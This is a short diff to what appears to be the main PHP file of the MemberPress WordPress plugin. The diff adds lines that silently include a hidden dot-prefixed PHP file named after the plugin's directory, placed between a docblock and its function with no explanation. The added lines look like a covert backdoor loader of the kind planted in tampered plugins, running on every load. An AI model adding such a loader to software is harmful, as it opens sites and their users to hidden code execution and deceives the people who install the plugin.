@@ -70,6 +70,10 @@ define('MEPR_MIN_PHP_VERSION', '5.6.20');
  *
  * @return string Plugin version
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function mepr_plugin_info($field) {
   static $curr_plugins;
 
